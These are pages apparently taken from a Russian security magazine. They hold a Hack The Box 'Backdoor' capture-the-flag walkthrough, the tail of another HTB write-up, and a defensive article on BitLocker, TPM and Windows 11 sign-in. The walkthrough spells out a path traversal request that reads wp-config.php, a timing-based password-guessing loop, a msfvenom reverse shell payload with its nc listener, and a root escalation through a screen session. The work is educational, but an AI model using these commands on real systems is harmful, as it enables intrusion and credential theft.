       echo -n " $var " ; echo "$passw$var        " | time su 2>&1 |
grep elapsed | cut -d ' ' -f 3 | grep -v '0:01.1' && echo " - $var" &
& break
done




                        Подбор второго символа

И таким образом перебираем все десять символов.




                      Подбор последнего символа

Когда получен последний символ, попробуем сменить пользователя через
su.





                           Флаг рута

Машина захвачена!
ВЗЛОМ

        HTB
 BACKDOOR





   ВЗЛАМЫВАЕМ САЙТ НА WORDPRESS
     И ПРАКТИКУЕМСЯ В РАЗВЕДКЕ





Сегодня мы с тобой на примере легкой
по уровню сложности машины Backdoor
с площадки Hack The Box поупражняемся
в простейших атаках на веб‑приложения.
Поищем уязвимые плагины для WordPress,             RalfHacker                                                                                             hackerralf8@gmail.com
проэксплуатируем  уязвимость  типа  path
traversal, переберем информацию о про‐
цессах при помощи Burp и повысим при‐
вилегии в системе через пользовательский
скрипт.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.125    backdoor.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта.


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$/ /)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Мы нашли два открытых порта:
 • 22 — служба OpenSSH 8.2p1;
 • 80 — веб‑сервер Apache 2.4.41.

SSH смело пропускаем, там делать нечего.

Справка: брутфорс учеток
Поскольку вначале у нас нет учетных данных, нет и смысла изучать службы,
которые всегда требуют авторизации (например, SSH). Единственное, что мы
можем делать здесь, — перебирать пароли брутфорсом, но машины с HTB
почти всегда можно пройти по‑другому. В жизни таких вариантов может
не  быть,  к тому же есть шансы  подобрать пароль или получить его
при помощи социальной инженерии.


Изучим  веб‑сервер. Nmap  сразу  показал,  что там  установлен  движок
WordPress 5.8.1.





                           Главная страница сайта

Кстати, ту же самую информацию (и даже чуть подробнее) можем получить,
проанализировав сайт утилитой whatweb.


whatweb http://backdoor.htb




                        Вывод программы whatweb


ТОЧКА ВХОДА
При тестировании сайтов на WordPress лучше всего использовать утилиту
wpscan. С ее помощью  можно  обнаружить  уязвимые  версии самого
WordPress, тем и плагинов, а также собрать список пользователей и переб‐
рать учетные данные. В общем, все, что нужно. Перед началом сканирования
советую  зарегистрироваться на  официальном  сайте и  получить  токен
для доступа к API. Это бесплатно.
   Чаще всего уязвимости присутствуют в плагинах, поэтому я зарядил их
перебор (опция -e ap) в агрессивном режиме (опция --plugins-detection
aggressive), используя 100 потоков (опция -t 100).


wpscan --url http://backdoor.htb/ -e ap --plugins-detection
aggressive -t 100





                         Обнаруженные плагины

Потратив несколько минут, мы получаем отчет, в котором отмечены два пла‐
гина. Об уязвимостях ничего не сообщается, но в ebook-download не про‐
индексирован каталог, что позволяет просмотреть его содержимое.





                  Содержимое каталога ebook-download

Из файла readme.txt узнаем версию плагина — 1.1. Странно, ведь сканер
отобразил 1.5.





                      Содержимое файла readme.txt

Ищем известные уязвимости и эксплоиты для ebook-download 1.1 и находим
PoC.

Справка: поиск готовых эксплоитов
При пентесте лучше всего искать эксплоиты в Google, поскольку этот поис‐
ковик заглядывает и в личные блоги, и в самые разные отчеты. Ускорят дело
специализированные базы вроде Exploit-DB — там часто можно обнаружить
подходящие варианты. Если ты работаешь в специализированной ОС вроде
Kali Linux, то эта база у тебя уже есть и для поиска можно использовать ути‐
литу searchsploit.





                          Описание эксплоита


ТОЧКА ОПОРЫ
Уязвимость и эксплоит очень простые. Это path traversal, то есть возможность
обращаться к родительскому каталогу (../) при указании пути к файлу. Три
таких шага, и мы выбираемся в корневую директорию WordPress, где можем
прочитать файл с конфигурацией. Делается это одним запросом:


http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.
php?ebookdownloadurl=../../../wp-config.php





                    Содержимое файла wp-config.php

Здесь хранятся учетные данные для подключения к базе данных. Первая
идея — попробовать эти учетные данные для логина по SSH (не вышло)
и доступа к панели администрирования WordPress, расположенной в каталоге
/wp-admin/. Авторизоваться на сайте также не вышло.





                    Ошибка авторизации WordPress

Тогда мы можем поискать другие интересные файлы и получить больше
информации с сервера. Я использовал список с такими файлами и потратил
много времени на их просмотры, ведь мы можем прочитать почти все,
для чего хватает привилегий. И ничего интересного, кроме файла /proc/
self/cmdline.





                  Содержимое файла /proc/self/cmdline

Файловая система /proc — это специальная ФС, которая есть во многих
современных UNIX-системах. В ней можно найти массу полезной информа‐
ции в текстовом виде. Внутри каталога /proc — огромное число других
каталогов с цифровыми названиями. Имя каждого такого каталога соответс‐
твует идентификатору работающего в системе процесса (PID). А файл /
proc/[pid]/cmdline содержит аргументы командной строки, с которыми
был запущен процесс. Идентификатор self указывает на текущий процесс.
   После этой находки у меня возникла идея проверить аргументы коман‐
дной строки всех процессов, вдруг какому‑то из них были переданы учетные
данные. С помощью Burp Intruder можно перебрать идентификаторы. Это лег‐
ко сделать, указав Numbers в качестве типа нагрузки и промежуток перебора
от 0 до 10 000 с шагом 1.





                        Burp Intruder — Positions





                        Burp Intruder — Payloads





                              Результаты перебора

Учетных данных не находим, зато отмечаем, что на порте 1337 запущен
gdbserver. Мы не знаем версии, поэтому попробуем найти просто самый
новый эксплоит.
   Первая же ссылка в Google наводит нас на скрипт, который эксплуатирует
RCE-уязвимость в gdbserver 9.2. Чтобы воспроизвести это, сгенерируем
файл с нагрузкой при помощи MSFvenom:


msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.73 LPORT= 4321
PrependFork=true -o rev.bin

Затем с использованием netcat создадим листенер для приема бэкконнекта.


Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, который запустил шелл. Для приема соеди‐
нения необходимо создать на локальной машине  listener, то есть «слу‐
шатель».
  В таких случаях пригодится rlwrap — readline-оболочка, которая в числе
прочего позволяет пользоваться историей команд. Она обычно доступна
в репозитории дистрибутива.
  В качестве самого листенера при этом можно использовать широко
известный netcat.


 rlwrap nc -lvp [port]




Для этого выполним такую команду:


rlwrap -cAr nc -lvnp 4321

И запустим эксплоит.





                           Выполнение эксплоита





                           Бэкконнект от сервера

Получаем интерактивную TTY-оболочку и читаем первый флаг — поль‐
зовательский.


python3 -c "import pty;pty.spawn('/bin/bash')"




                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Для захвата флага рута нам понадобится повысить привилегии в системе.
Самые очевидные шаги для этого — проверить настройки sudoers, приложе‐
ния с выставленным битом SUID, прослушиваемые на локальном хосте порты
и список запущенных приложений. Везет с последним пунктом. Мы находим
работающий в системе пользовательский скрипт.




                      Список запущенных процессов

На хосте каждую секунду запускается команда find:


find /var/run/screen/S-root/ -empty -exec screen -dmS root

Если она находит процесс screen, то выполняет действие exec, что приведет
к запуску screen в автономном режиме (причем запущенном от имени супер‐
пользователя). То есть мы можем запустить screen и подключиться ко вто‐
рому, запущенному командой find привилегированному процессу.


export TERM=xterm
screen -x root/root

Это дает нам привилегированный шелл.





                           Флаг рута

Машина захвачена!
ПРИВАТНОСТЬ

РЕШЕТКИ
    НА «ОКНА»





 ЗАЩИЩАЕМ КОМПЬЮТЕРЫ С WINDOWS 10
     И ОСОБЕННО — С WINDOWS 11





Защитить компьютер с Windows не просто,
а  очень   просто:   несколько   щелчков
мышью — и системный раздел зашифрован
BitLocker. Но может случиться так, что взло‐
мать этот компьютер будет еще проще:           Олег Афонин                                                                                      Эксперт по мобильной
достаточно узнать пароль от твоей учетной       криминалистике компании                                                                                         «Элкомсофт»
записи  Microsoft,  чтобы  разблокировать        aoleg@voicecallcentral.com
систему, несмотря на шифрование. Оче‐
редной шаг в борьбе щита и меча сделан
в Windows 11: здесь используется аппарат‐
ный  контроль  безопасности,  а  взлом
пароля  при  соблюдении  определенных
условий будет не только совершенно бес‐
полезным, но и невозможным.


Насколько безопаснее стала Windows 11 в сравнении с «десяткой» и почему?
Можно ли обезопасить Windows 10 штатными средствами, не прибегая
к VeraCrypt и подобным инструментам? И для чего же, в конце концов,
Windows 11 так нужен TPM?
   Когда я начал разбираться в том, как именно, а главное — для чего в один‐
надцатой версии Windows используются модули TPM, я чуть не сломал голову.
Традиционно для Microsoft документация существует, ее много, но написан‐
ное в ней далеко не всегда соответствует действительности; ряд утвержде‐
ний (мы рассмотрим их ниже) вселяет ложную уверенность в безопасности.
Помнишь, сколько копий было сломано по поводу системных требований
Windows 11? Теперь я готов поверить, что решение ограничить совмести‐
мость Windows 11 исключительно системами, оборудованными TPM, было
не волей  маркетологов, а  ультиматумом команды  разработчиков: «Или
компьютеры без TPM идут лесом, или мы умываем руки!»


ВКЛЮЧАЕМ BITLOCKER
Шифрование системного раздела — первый, необходимый, но не всегда
достаточный шаг к обеспечению безопасности системы. На безопасность
зашифрованных данных может повлиять такая неочевидная на первый взгляд
вещь, как способ входа в систему.
   Примем за аксиому, что в твоем компьютере установлен и активирован
в настройках UEFI BIOS модуль TPM 2.0 или его аналог (Intel Platform Trust
Technology или AMD firmware TPM). Чуть позже я расскажу о том, что можно
сделать при его отсутствии, но пока рассмотрим работу относительно сов‐
ременных систем.


      TPMНо ведь     у нас запрещен?
В сети ходит много непроверенной информации о законности или незакон‐
ности TPM. По слухам, ФСБ запрещает модули TPM из‑за того, что те могут
использоваться для шифрования без закладок. Не буду утомлять тебя юри‐
дическими  подробностями  (составленная  юристами  докладная  записка
занимает несколько листов), ограничусь лишь краткими выводами.
   Во‑первых, на ввоз в страну аппаратных модулей TPM требуется нотифи‐
кация (то есть для импортеров действует разрешительный режим). Во‑вто‐
рых, использование TPM частными лицами внутри страны никаких законов
не нарушает. Наконец, в‑третьих: эмуляция TPM вполне легально присутству‐
ет во всех процессорах Intel Core с 8-го поколения, а также во всех процес‐
сорах с архитектурой AMD Zen и более новых. Использование соответству‐
ющих функций законным образом ввезенных в страну комплектующих никаких
правил не нарушает.


Чтобы включить шифрование системного  диска, пользователям Windows
10 и 11 всех редакций за исключением домашней (Home) достаточно открыть
апплет BitLocker Drive Encryption в панели управления Windows. Далее нужно
включить шифрование (для твердотельных накопителей вполне достаточно
зашифровать только данные; свободное место накопитель очищает самос‐
тоятельно по команде trim) и где‑то сохранить (или распечатать) ключ вос‐
становления доступа. Шифрование происходит в фоновом режиме; через
некоторое время данные будут зашифрованы, накопитель будет выглядеть
следующим образом.





                       Зашифрованный накопитель


ДЛЯ ЧЕГО НУЖЕН КЛЮЧ ВОССТАНОВЛЕНИЯ ДОСТУПА (BITLOCKER
RECOVERY KEY)
Не хотелось бы в этой статье глубоко вдаваться в подробности механизма
шифрования BitLocker (о нем можно прочитать, например, здесь. В двух сло‐
вах: именно ключ восстановления доступа поможет тебе разблокировать
накопитель, если модуль TPM по какой‑то причине решит не отдавать сис‐
теме ключ.
  В каких случаях TPM может «зажать» ключ? В принципе, это может про‐
изойти после любого обновления прошивки либо BIOS самого компьютера
или любого подключенного устройства (кроме USB). Еще при изменении
аппаратной конфигурации (установил новую видеокарту), при обновлении
Windows или одного из драйверов, участвующих в цепочке загрузки. Если
такое событие произойдет, то цепочка загрузки нарушится (не совпадут
вычисленные в регистрах PCR контрольные суммы) и TPM не отдаст операци‐
онной системе ключ, который нужен для разблокировки диска. Как резуль‐
тат — при загрузке система попросит ввести код восстановления доступа.





           Система попросит ввести код восстановления доступа

Поскольку при использовании TPM другого метода разблокировки диска
по умолчанию не предусмотрено, ключ восстановления доступа остается
единственным способом получить доступ к данным.
   Почему же этого не происходит каждый раз, когда ты обновляешь ОС
через Windows Update? Дело в том, что система знает об этой особенности
BitLocker и на время установки отключает защиту. Ровно то же самое ты
можешь   проделать   вручную,   воспользовавшись   командой  Suspend
protection.





                         Suspend protection

После  этого ты можешь спокойно обновить BIOS, заменить видеокарту
или обновить прошивку одного из устройств. После перезагрузки система
вычислит новую цепочку  загрузки, которая будет  считаться доверенной,
а шифрование автоматически включится.


КАКИЕ ЕСТЬ РИСКИ ПРИ ШИФРОВАНИИ BITLOCKER С
ИСПОЛЬЗОВАНИЕМ TPM
Шифрование BitLocker достаточно надежно, хотя использующийся 128-бит‐
ный ключ вызывает некоторые сомнения в контексте потенциальной уяз‐
вимости для квантовых компьютеров. Если тебя это беспокоит — включи 256-
битное шифрование в настройках групповых политик, как показано на скрин‐
шоте. Сделать это необходимо до того, как диск будет зашифрован; настрой‐
ка не влияет на уже созданные зашифрованные диски.





                  Включение 256-битного шифрования

Проверить, что получилось, можно командой manage-bde -status.



  Volume C: [NVME]
  [OS Volume]
  Size:                 930,40 GB
  BitLocker Version:    2.0c
  Conversion Status:    Used Space Only Encrypted
  Percentage Encrypted: 100,0%
  Encryption Method:    XTS-AES 256
  Protection Status:    Protection On
  Lock Status:          Unlocked
  Identification Field: Unknown
  Key Protectors:
  TPM
  Numerical Password


Еще один связанный с BitLocker риск возникает из‑за того, что модуль TPM
выдаст ключ шифрования, а Windows автоматически смонтирует зашиф‐
рованный диск в процессе загрузки, если цепочка доверенной загрузки
не была нарушена. Таким образом, к моменту, когда Windows запрашивает
твой пароль (или идентификацию через Windows Hello), зашифрованный диск
уже смонтирован, а ключ шифрования… Он, в отличие от систем с macOS,
оборудованных чипом T2, хранится в оперативной памяти в чистом, незащи‐
щенном виде. Да, злоумышленник не сможет разблокировать компьютер,
не зная пароля от твоей учетной записи (или не воспользовавшись твоими
биометрическими данными для входа через Windows Hello), однако существу‐
ют способы извлечь ключ шифрования из оперативной памяти. Впрочем, спо‐
собы эти настолько технически сложные, что используют их крайне редко
и только при расследовании громких дел.


             INFO

                         Среди  прочего Windows  Hello может работать
                        с датчиками отпечатков пальцев и инфракрасны‐
                    ми видеокамерами. Чем‑то подобным оборудо‐
                      ваны  практически все  современные  ноутбуки,
                      но никто не запрещает тебе подключить такое
                          устройство и к десктопу.


Наконец, в самих модулях TPM (а точнее, в коммуникационном протоколе,
по которому этот модуль общается с системой) существует даже не уяз‐
вимость, а огромная зияющая дыра: данные, в том числе ключ к зашифрован‐
ному диску, передаются в открытом виде, и их достаточно просто перех‐
ватить. Подробнее об этом читай в нашей статье «Страшный сон TPM. Взла‐
мываем защиту модулей TPM и шифрование BitLocker».
   Впрочем, эта уязвимость срабатывает только при использовании внешних
модулей TPM, которые подключаются к материнской плате через специаль‐
ный разъем. Эмуляторы Intel PTT и AMD fTPM этой уязвимости не подвержены
и, соответственно, обладают более высоким в сравнении с отдельными
модулями уровнем безопасности.
  Все перечисленные риски действительно существуют, но в реальности их
влияние на безопасность минимально: при включении шифрования сис‐
темного диска файлы подкачки и гибернации шифруются вместе с осталь‐
ными данными, а извлечь ключ шифрования из модуля TPM невозможно,
как невозможно его перехватить при использовании эмуляции TPM. Если
для входа в систему ты используешь локальную учетную запись, пароль
от которой сложный, уникальный, нигде более не используется и не хранится,
то и подобрать его не представляется возможным (напомню, чтобы взломать
пароль NTLM, нужно для начала вытащить базу данных SAM, которая зашиф‐
рована вместе с остальными данными, и подобраться к ней, не разблокиро‐
вав сначала зашифрованный диск, не удастся).
   Совсем иначе выглядит уязвимость, связанная с новым типом учетных
записей Microsoft Account, которые появились еще во времена Windows 8.


В ЧЕМ ПРОБЛЕМА С УЧЕТНЫМИ ЗАПИСЯМИ MICROSOFT?
В Windows 10 предусмотрено несколько типов учетных записей, из которых
мы рассмотрим две: локальную учетную запись (Windows account) и учетную
запись Microsoft (Microsoft account). По поводу обычных учетных записей все
ясно: она безопасна ровно настолько, насколько безопасен (сложен и уни‐
кален) придуманный тобой пароль. А вот если используется учетная запись
Microsoft, дело принимает куда более интересный оборот.


             INFO

                          Отмечу еще один факт. Для портативных устрой‐
                         ств с BitLocker Device Encryption ОС автоматичес‐
                        ки создает ключ восстановления при шифровании
                            системного раздела. Ключ восстановления будет
                            также автоматически загружен в учетную запись
                           Microsoft первого пользователя, который войдет
                        в систему на этом компьютере с правами адми‐
                            нистратора  и   использует   учетные   данные
                           Microsoft  для  авторизации.  Этот ключ может
                        получить  любой  пользователь,  просто  войдя
                        в  учетную  запись  Microsoft  от  твоего  имени
                      и     перейдя    по    следующей     ссылке:
                          https://account.microsoft.com/devices/recoverykey.


Как работают и для чего нужны учетные записи Microsoft? В Windows 10 (а так‐
же в Windows 8 и 8.1) для входа в систему можно использовать не только
локальную учетную запись, но и учетную запись Microsoft Account — ту самую,
через которую ты получаешь  доступ к онлайновому почтовому сервису
Hotmail,  мессенджеру  Skype,  облачному  хранилищу  OneDrive,  подписке
на Office 365 и многим другим сервисам Microsoft. В последующих выпусках
Windows учетным записям Microsoft Account придавался все больший вес,
а установка ОС без нее становилась все более сложной. В младших редак‐
циях Windows использование локального логина и пароля и вовсе ограничи‐
ли: настроить систему при установке можно исключительно с использовани‐
ем онлайновой учетной записи.
   Первый вход в учетную запись Microsoft Account требует наличия активно‐
го соединения с интернетом. Данные учетной записи проверяются Microsoft
на удаленном сервере, после чего хеш от пароля сохраняется (кешируется)
на компьютере; это позволяет входить в учетную запись, когда соединение
отсутствует. У такого поведения есть и обратная сторона: если системный
диск не зашифрован, то хеш можно извлечь из соответствующей базы данных
на компьютере, после чего восстановить оригинальный пароль через быс‐
трую офлайновую атаку.
   Подчеркну, что  восстанавливается именно пароль от учетной записи
Microsoft Account, с помощью которого можно авторизоваться не только
на атакуемом компьютере, но и в онлайновых сервисах Microsoft, получив,
таким образом, доступ к переписке в Hotmail, чатам Skype, файлам OneDrive
и другой информации. Более того, в учетных записях Microsoft хранятся в том
числе и депонированные ключи BitLocker, использующиеся для восстанов‐
ления доступа к зашифрованным дискам. Добавлю, что скорость  атаки
на пароли Windows исключительно высокая, а это позволяет (в отсутствие
шифрования) в разумные сроки восстанавливать даже достаточно сложные
пароли. Когда‑то давно я уже писал об этой уязвимости в статье «Microsoft
Account: удобство или дыра в безопасности?».
   Использование двухфакторной аутентификации может защитить содер‐
жимое  онлайновой  учетной  записи,  однако пароль  от  учетной записи
Microsoft, извлеченный, например, из твоего телефона или с другого компь‐
ютера, шифрование на котором не включено, позволяет разблокировать
и твой компьютер с TPM, даже если его системный диск зашифрован.
   Разработчики Microsoft предложили дополнительные способы авториза‐
ции — в первую очередь вход по PIN-коду (о нем будет чуть ниже). Однако
даже включение логина по PIN-коду не решает ни одной из двух проблем:
возможности восстановления оригинального пароля от онлайновой учетной
записи через быструю офлайновую атаку (если системный диск компьютера
не  зашифрован) и  возможности  разблокировать  зашифрованный  диск
паролем от учетной записи Microsoft, если его удалось узнать, подсмотреть
или извлечь с другого устройства.
   Подводя итог, проблемы с логином в Windows при использовании учетной
записи Microsoft можно сформулировать следующим образом.
 1. Если злоумышленник получит доступ к любому устройству, на котором хра‐
   нится пароль от учетной записи Microsoft, то с этим паролем он сможет
   залогиниться в твой компьютер с Windows 10 — даже если в компьютере
   есть модуль TPM, а системный диск зашифрован BitLocker.
 2. Если на одном из компьютеров с Windows 10, на котором присутствует
   твоя учетная запись Microsoft, системный диск не будет зашифрован, то
   пароль от онлайновой учетной записи может быть восстановлен очень
   быстрой атакой в режиме офлайн.

Именно эти проблемы разработчики Microsoft решили исправить в Windows
11, добавив новый тип учетных записей Microsoft, пароль для входа в которые
не требуется.


ЧТО ИЗМЕНИЛОСЬ В WINDOWS 11
В новой версии ОС разработчики героически преодолевают последствия
старого, еще времен Windows 8, решения использовать для входа в систему
логин и пароль от онлайновой учетной записи. Как можно обезопасить
компьютер от входа по паролю от учетной записи Microsoft, который зло‐
умышленник может подсмотреть или извлечь из твоего телефона? Конечно
же, запретив использование этого пароля для входа в систему! Впрочем,
пока воздержимся от фейспалма, благо разработчики Microsoft решили
проблему не настолько прямолинейно.
   Итак, в Windows 11 появляется новый тип учетных записей, использующих
для авторизации входа в систему Microsoft Account, которым не нужен пароль
от онлайновой учетной записи. При использовании таких учеток для входа
в систему не требуется (да и невозможно) вводить пароль от учетной записи
Microsoft; вместо пароля используется PIN-код или биометрические данные
подсистемы Windows Hello (например, видеопоток с сертифицированной
инфракрасной  стереокамеры или  данные  датчика  отпечатков  пальцев).
О том, где хранится PIN-код и почему такой способ авторизации заметно
безопаснее входа по паролю, расскажу дальше; сейчас же перечислим дос‐
тупные в Windows 11 для обычного (не доменного) пользователя способы
входа в систему.
 • Учетная запись Microsoft Account без пароля — используется
   по умолчанию. Пароль для входа в систему ввести невозможно; поддержи‐
   вается вход по PIN-коду (TPM), Windows Hello или через авторизацию
   в приложении Microsoft Authenticator (онлайн).
 • Учетная запись Microsoft Account с паролем. Хеш пароля к учетной
   записи хранится локально и не защищается TPM. Поддерживается вход
   по PIN-коду (TPM), Windows Hello. Так было в Windows 10, и так остается
   при обновлении Windows 10 до Windows 11.
 • Локальная учетная запись Windows (вход по паролю). Для входа
  может использоваться локальный пароль (его хеш хранится в системе,
   не защищается TPM), PIN (TPM) или Windows Hello.



                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИПРИВАТНОСТЬ
  РЕШЕТКИ НА «ОКНА»
          ЗАЩИЩАЕМ КОМПЬЮТЕРЫ С WINDOWS 10
                  И ОСОБЕННО — С WINDOWS 11





В КАКИХ СЛУЧАЯХ В WINDOWS 11 ИСПОЛЬЗУЕТСЯ ВХОД БЕЗ
ПАРОЛЯ?
В Windows 11 поддерживаются способы входа как по паролю, так и без него.
Режим входа без пароля используется в новом типе учетных записей и вклю‐
чается по умолчанию как во время установки Windows 11 на новый компь‐
ютер, так и при создании новой учетной записи на компьютерах, на которых
Windows 11 была установлена в виде обновления Windows 10. В то же время
существующие в Windows 10 учетные записи, в которых для входа исполь‐
зовался пароль, остаются в Windows 11 в неизменном виде. Чтобы включить
вход без пароля,  пользователю необходимо  выбрать  соответствующую
опцию в настройках системы (Sign-in options).





                Включение входа без пароля в Windows 11

Также этот способ входа можно активировать через Windows Registry.





     Включение входа без пароля в Windows 11 через Windows Registry

Подытожим:
 • При установке Windows 11 на новый компьютер используется Microsoft
   Account, вход без пароля.
 • При обновлении с Windows 10: используется тот же способ входа, что и в
   оригинальной ОС Windows 10.
 • Новые учетные записи, создаваемые в Windows 11, установленной любым
   способом: используется Microsoft Account, вход без пароля.


А что в Windows 11 с BitLocker?
Ни сам механизм BitLocker, ни политики шифрования в Windows 11 не претер‐
пели серьезных изменений в сравнении с Windows 10. После анонса Windows
11 у многих обозревателей возникло впечатление, что Microsoft будет шиф‐
ровать системный раздел Windows 11 так же, как это делают производители
смартфонов. Ожидания не оправдались. По умолчанию (через BitLocker
Device Encryption) шифруются лишь оборудованные TPM портативные устрой‐
ства — ноутбуки, планшеты и устройства «два в одном»; однако точно таким
же образом шифрование включалось и в Windows 8, и в Windows 10. При уста‐
новке Windows 11 на настольный компьютер шифрование по умолчанию
не включается; более того, чтобы использовать BitLocker, требуется редакция
Windows 11 Pro, Enterprise или Education. Для пользователей младшей редак‐
ции Home шифрование остается недоступным.



PIN-КОД ВМЕСТО ПАРОЛЯ: ЭТО ДЕЙСТВИТЕЛЬНО БЕЗОПАСНЕЙ?
Наконец мы добрались до PIN-кодов — того «нового» способа авторизации,
который Microsoft предлагает использовать вместо «устаревшего и небезо‐
пасного» пароля. Почему — внезапно! — авторизация по паролю стала «уста‐
ревшей и  небезопасной»?  Приведу  информацию  из  статьи  Microsoft,
в которой и описаны основные различия между подходами.


             INFO

                    А знаешь ли ты, что в Windows 10 также исполь‐
                             зуется (точнее, может использоваться… а может
                      и не использоваться) модуль безопасности TPM
                         2.0?  Разница  между Windows 10 и Windows
                     11 не в масштабах использования TPM (здесь я
                      не увидел принципиальных отличий), а в том, что
                        в Windows 11 TPM обязателен, а в Windows 10 —
                           нет. Эта, казалось бы, небольшая разница при‐
                       водит  к  глобальным  последствиям  в области
                         безопасности при использовании входа по PIN-
                        коду вместо пароля. Подробно об этом Microsoft
                             рассказывает в следующей статье (на англий‐
                        ском).


В этой статье Microsoft высказывает несколько не вполне корректных утвер‐
ждений, «очевидная» интерпретация которых создает ложное ощущение
безопасности. Разберем подробности. Ниже приводится цитата из статьи
(Microsoft использует автоматический перевод; я сохранил орфографию ори‐
гинала):

    ПИН‑код привязан к устройству
       Одно важное отличие между онлайн‑паролем и ПИН‑кодом Hello сос-«
      тоит в  том,  что ПИН‑код  привязан  к  определенному  устройству,
      на котором он был  настроен. ПИН‑код не может  использоваться
      без  конкретного  оборудования.  Кто‑то,  кто  крадет ваш  пароль
      в Интернете, может войти в вашу учетную запись из любого места,
      но если он  украдет ПИН‑код, им  также  придется  украсть ваше
      физическое устройство!

    ПИН‑код поддерживается оборудованием
     ПИН‑код  Hello  поддерживается  микросхемой  доверенного  плат-
      форменного модуля (TPM), представляющей собой надежный крип-
       тографический процессор для выполнения операций шифрования. Эта
       микросхема  содержит  несколько  механизмов  физической защиты
      для предотвращения  взлома, и вредоносные программы не могут
       обойти функции безопасности TPM. Многие современные устройства
      имеют TPM. Windows 10, с другой стороны, имеет дефект, не связыва-
     ющий локальные пароли с TPM. Именно по этой причине ПИН‑коды
       считаются более безопасными, чем локальные пароли.                »
Если воспринимать информацию буквально, создается ощущение, будто PIN-
код — это своеобразная панацея, всегда хранится в модуле TPM и не может
быть взломан. Это не так. Дело в том, что Windows 10 работает как на компь‐
ютерах с модулем TPM, так и без него, причем пользователю об этом сис‐
тема не сообщает. Более того, даже на компьютерах, в прошивке которых
присутствует эмуляция TPM, эта эмуляция чаще всего по умолчанию отклю‐
чена — пользователю предлагается самостоятельно зайти в UEFI BIOS, отыс‐
кать меню Miscellaneous и включить настройку, которая может называться,
к примеру, Intel Platform Trust Technology (PTT). Сколько пользователей вклю‐
чит эту настройку, а какое количество оставит ее неизменной или просто
не узнает о ее существовании?





                            Intel Platform Trust Technology (PTT)

Если TPM в системе отсутствует или не включен в UEFI BIOS, Windows
11 просто откажется от установки. А вот Windows 10 все равно предложит
использовать для входа PIN-код, а Microsoft все так же будет убеждать, что
этот способ входа более безопасен по сравнению с паролем. Это не так.
Пароль от учетной записи в виде хеша все так же хранится на диске, а сам
PIN-код с компьютера без TPM можно взломать простым перебором (циф‐
ровые PIN-коды, даже шестизначные, получится перебрать за считаные
секунды).


БЕЗ МОДУЛЯ TPM ВХОД В WINDOWS ПО PIN-КОДУ НЕБЕЗОПАСЕН
Совсем иначе дела обстоят в случае, если в системе присутствует и акти‐
вирован модуль TPM 2.0 в физическом виде либо в виде процессорной эму‐
ляции. Рассмотрим поведение системы в следующих сценариях, которые мы
протестировали в нашей лаборатории.
  Сценарий 1: система с Windows 10 (вход по PIN-коду) без TPM перено‐
сится на другой компьютер без TPM. Переносится физический диск с уста‐
новленной ОС. Результат: вход по PIN-коду срабатывает на новом компьюте‐
ре так же, как и на старом.
  Сценарий 2: система с Windows 10 (вход по PIN-коду) без TPM перено‐
сится на другой компьютер без TPM. Переносится только копия раздела
с установленной ОС; аппаратное обеспечение между двумя компьютерами
не совпадает ни по одной позиции. Результат: вход по PIN-коду срабатывает
на новом компьютере так же, как и на старом.
  Сценарий 3: система с Windows 10 (вход по PIN-коду) без TPM перено‐
сится на компьютер с установленным и активным модулем TPM. Переносится
только копия раздела с установленной ОС; аппаратное обеспечение между
двумя компьютерами не совпадает ни по одной позиции. Результат: вход
по PIN-коду срабатывает на новом компьютере так же, как и на старом.
  Сценарий 4: система с Windows 10 (вход по PIN-коду) с активным
модулем TPM переносится на другой компьютер с активным модулем TPM.
Переносится копия раздела с установленной ОС; аппаратное обеспечение
между двумя компьютерами не  совпадает.  Результат: вход по PIN-коду
на новом компьютере не срабатывает; для входа требуется пароль от учетной
записи; для использования PIN-кода потребовалось удалить старый PIN
и настроить новый.
   Очевидно, что только четвертый сценарий соответствует модели безопас‐
ности, описанной Microsoft в статье.


МОЖНО ЛИ ИСПОЛЬЗОВАТЬ ВХОД БЕЗ ПАРОЛЯ В WINDOWS 10?
Можно. Но нужно ли?
  В сентябре 2021 года компания анонсировала свое видение будущего
без паролей. Пользователям очередной сборки Windows 10 предлагалось
изменить настройки учетной записи Microsoft Account, запретив вход в нее
по паролю. Такая учетная запись для входа в систему позволяла избавиться
от хранения хеша пароля на локальном компьютере. В то же время поль‐
зователь терял возможность войти в учетную запись Microsoft из браузера
по логину и паролю; для успешного входа требовался доступ к доверенному
телефонному номеру или ранее авторизованному устройству с установ‐
ленным на нем приложением Microsoft Authenticator. С учетом того, что дан‐
ное приложение доступно исключительно для смартфонов на iOS и Android
(но не для компьютеров под управлением Windows), целесообразность
нововведения представляется несколько сомнительной. Подробнее об этом
можно прочитать здесь. Новшество не получило заметного распространения
из‑за  неочевидных  преимуществ и  существенного  неудобства  исполь‐
зования.





                          Учетная запись без пароля


КАК WINDOWS ИСПОЛЬЗУЕТ TPM ПРИ АВТОРИЗАЦИИ ВХОДА В
СИСТЕМУ ЧЕРЕЗ PIN
В  документации  Microsoft  описаны  способы,  которыми Windows может
использовать аппаратный модуль безопасности. Реальность значительно
скромнее: «может» не означает «использует». Так, пароли, которые поль‐
зователь хранит в браузере Microsoft Edge, защищены механизмом DPAPI,
но ключ шифрования хранится на системном диске (он зашифрован данными
учетной записи) и не защищается TPM, что позволяет извлечь эти пароли
из образа диска, если известен пароль от учетной записи пользователя.
   Вместо  того  чтобы  использовать TPM для  хранения все  большего
